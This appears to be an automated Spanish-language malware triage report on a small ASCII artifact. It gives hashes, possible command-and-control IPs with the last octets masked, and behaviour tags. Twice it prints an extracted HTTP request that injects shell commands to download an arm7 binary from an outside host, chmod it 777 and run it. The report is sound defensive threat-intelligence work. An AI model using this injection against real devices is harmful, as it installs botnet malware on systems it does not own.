# 🧬 Payload Analysis

`6edd24171fe2fe222a65e5edc6d4313de30f7f2e90676d58a2b316118cdb1d55`

## 📌 Resumen

Artefacto de 396 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.38. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos. **C2 / infraestructura de control:**

- **Posible C2:** `190.179.168.XXX` — confianza Alto, evidencia hardcoded_in_payload
- **Posible C2:** `94.154.43.XXX` — confianza Descartado, evidencia hardcoded_in_payload


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:04:38.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6edd24171fe2fe222a65e5edc6d4313de30f7f2e90676d58a2b316118cdb1d55`
- **SHA1:** `0abe9a277edff5b9dece89cca46942f2413104a2`
- **MD5:** `40fbd5ae0d1caf202cc71e14a9ca7cab`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 396 B |
| Entropía | 5.38 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/94.154.43.XXX/arm7;chmod+777+arm7;./arm7 HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.168.XXX | static_analysis |
| ip | 94.154.43.XXX | static_analysis |
| command | GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/94.154.43.XXX/arm7;chmod+777+arm7;./arm7 HTTP/1.1 | strings |
| hash | 6edd24171fe2fe222a65e5edc6d4313de30f7f2e90676d58a2b316118cdb1d55 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
